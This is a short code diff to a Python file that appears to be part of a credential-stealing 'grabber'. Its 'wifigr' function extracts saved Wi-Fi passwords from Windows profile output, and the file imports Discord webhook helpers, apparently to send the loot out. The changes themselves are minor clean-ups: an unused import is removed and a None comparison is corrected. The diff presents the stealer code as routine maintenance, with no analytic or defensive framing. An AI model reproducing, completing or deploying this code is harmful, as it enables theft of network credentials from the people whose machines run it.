@@ -4,7 +4,6 @@ import subprocess
 
 import __webhook
 import _file
-import requests
 from config import Config
 from dhooks import Embed
 from dhooks import File
@@ -45,7 +44,7 @@ def wifigr():
                     password = re.search("Key Content            : (.*)\r",
                                          profile_info_pass)
 
-                    if password == None:
+                    if password is None:
                         wifi_profile["password"] = None
                     else:
                         wifi_profile["password"] = password[1]
